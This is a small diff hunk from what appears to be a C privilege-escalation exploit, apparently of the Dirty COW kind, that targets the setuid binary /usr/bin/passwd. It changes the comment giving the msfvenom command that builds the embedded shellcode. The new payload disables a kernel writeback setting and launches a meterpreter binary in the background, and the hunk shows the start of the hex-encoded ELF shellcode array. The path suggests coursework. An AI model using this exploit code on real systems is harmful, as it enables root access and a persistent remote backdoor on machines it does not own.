@@ -37,7 +37,7 @@ pthread_t pth1,pth2,pth3;
 char suid_binary[] = "/usr/bin/passwd";
 
 /*
-* $ msfvenom -p linux/x64/exec CMD=/bin/bash PrependSetuid=True -f elf | xxd -i
+* $ msfvenom -p linux/x64/exec -f elf PrependSetuid=True CMD="echo 0 > /proc/sys/vm/dirty_writeback_centisecs; /home/weak/HACS408V./meterpreter &" | xxd -i
 */ 
 unsigned char sc[] = {
   0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
